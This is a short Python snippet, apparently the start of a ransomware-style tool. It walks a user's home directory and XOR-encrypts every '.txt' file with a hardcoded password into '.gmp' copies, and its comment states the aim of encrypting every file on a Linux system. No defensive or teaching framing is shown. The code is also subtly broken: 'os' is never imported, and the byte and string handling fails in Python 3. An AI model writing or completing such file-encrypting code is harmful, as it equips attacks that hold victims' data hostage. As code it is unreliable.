class EncryptFileSystem(object):
    def __init__(self, password):
        self.password = password

    def encrypt_file(self, file_name):
        with open(file_name, 'rb') as f:
            plain_text = f.read()
        with open(file_name + '.gmp', 'wb') as f:
            f.write(self.encrypt(plain_text))

    def encrypt(self, plain_text):
        cipher_text = []
        for i in range(len(plain_text)):
            cipher_text.append(chr(ord(plain_text[i]) ^ ord(self.password[i % len(self.password)])))
        return ''.join(cipher_text)

# Enumerate every file in a linux system using a loop and encrypt them
def main():
    password = 'password'
    encrypt_fs = EncryptFileSystem(password)
    for root, dirs, files in os.walk('/home/user/'):
        for file in files:
            if file.endswith('.txt'):
                print('Encrypting file: ' + file)
                encrypt_fs.encrypt_file(os.path.join(root, file))
                